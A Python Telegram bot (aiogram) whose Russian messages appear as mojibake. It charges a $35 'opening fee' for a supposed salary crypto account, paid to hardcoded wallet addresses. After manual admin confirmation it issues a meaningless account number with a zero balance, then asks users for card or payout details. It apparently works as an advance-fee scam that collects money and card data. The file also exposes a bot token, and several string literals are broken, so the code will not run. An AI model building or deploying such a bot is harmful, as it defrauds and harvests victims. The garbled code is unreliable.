import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.enums import ParseMode
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from random import randint

TOKEN = "8122510813:AAHOpgwNJqUWUhuo01Wl0FywRS40sBARhR0"
ADMIN_ID = 7786764846
OPENING_FEE = 35

wallets = {
    "TRC20": "TQw19dGhSNeryY3eDX3byeD4KsThyNdCLU",
    "BEP20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "ERC20": "0x7a210fc89eccfaed2ea25cc27446e44743533ac2",
    "BTC": "1G7pG7WQwTvmmND9RgQFzkEQyuq9WAWeM3",
    "SOL": "3uUsgFUUUJLx5rYJ786rgcBozaxtFLvoSv1a2xvfbKrh"
}

bot = Bot(token=TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()
users = {}

def generate_account_id():
    return f"BW-{randint(1000000000000000, 9999999999999999)}"

@dp.message()
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üßæ –û—Ç–∫—Ä—ã—Ç—å —Å—á—ë—Ç –∑–∞ $35", callback_data="open")]
    ])
    await message.answer("–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! –ß—Ç–æ–±—ã –æ—Ç–∫—Ä—ã—Ç—å –∑–∞—Ä–ø–ª–∞—Ç–Ω—ã–π –∫—Ä–∏–ø—Ç–æ—Å—á—ë—Ç, –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", reply_markup=kb)

@dp.callback_query(lambda c: c.data == "open")
async def choose_network(callback: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=net, callback_data=f"pay:{net}")] for net in wallets
    ])
    await callback.message.edit_text("–í—ã–±–µ—Ä–∏—Ç–µ —Å–µ—Ç—å –¥–ª—è –æ–ø–ª–∞—Ç—ã:", reply_markup=kb)

@dp.callback_query(lambda c: c.data.startswith("pay:"))
async def show_wallet(callback: types.CallbackQuery):
    net = callback.data.split(":")[1]
    wallet = wallets[net]
    users[callback.from_user.id] = {"status": "awaiting_payment", "network": net}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚úÖ –Ø –æ–ø–ª–∞—Ç–∏–ª", callback_data="paid")]
    ])
    await callback.message.edit_text(
f"üí≥ –û—Ç–ø—Ä–∞–≤—å—Ç–µ <b>{OPENING_FEE}</b> –Ω–∞ –∞–¥—Ä–µ—Å –≤ —Å–µ—Ç–∏ <b>{net}</b>:"
<code>{wallet}</code>

–ü–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.",
        reply_markup=kb
    )

@dp.callback_query(lambda c: c.data == "paid")
async def notify_admin(callback: types.CallbackQuery):
    u = callback.from_user
    net = users.get(u.id, {}).get("network", "N/A")
    text = (
        f"üí∏ –ó–∞–ø—Ä–æ—Å –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å—á—ë—Ç–∞
"
        f"üë§ @{u.username or u.id}
"
        f"üåê –°–µ—Ç—å: {net}
"
        f"–ù–∞–∂–º–∏—Ç–µ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data=f"confirm:{u.id}")]
    ])
    await bot.send_message(ADMIN_ID, text, reply_markup=kb)
    await callback.message.edit_text("–û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞...")

@dp.callback_query(lambda c: c.data.startswith("confirm:"))
async def confirm_account(callback: types.CallbackQuery):
    uid = int(callback.data.split(":")[1])
    acc_id = generate_account_id()
    users[uid] = {"account_id": acc_id, "balance": 0}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üí∏ –í—ã–≤–µ—Å—Ç–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞", callback_data="withdraw")]
    ])
    await bot.send_message(uid, f"‚úÖ –í–∞—à –∫—Ä–∏–ø—Ç–æ—Å—á—ë—Ç –æ—Ç–∫—Ä—ã—Ç!
–ù–æ–º–µ—Ä: <code>{acc_id}</code>
–ë–∞–ª–∞–Ω—Å: $0.00", reply_markup=kb)
    await callback.message.edit_text("–°—á—ë—Ç –ø–æ–¥—Ç–≤–µ—Ä–∂–¥—ë–Ω.")

@dp.callback_query(lambda c: c.data == "withdraw")
async def withdraw(callback: types.CallbackQuery):
    await callback.message.answer("üí∏ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –∏ —Å–ø–æ—Å–æ–± –≤—ã–≤–æ–¥–∞ (–∫–∞—Ä—Ç–∞ –†–§, –°–ë–ü –∏–ª–∏ –∫—Ä–∏–ø—Ç–∞).
–ü—Ä–∏–º–µ—Ä:
<code>100 USDT –Ω–∞ –∫–∞—Ä—Ç—É 5469 **** **** 1234</code>")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
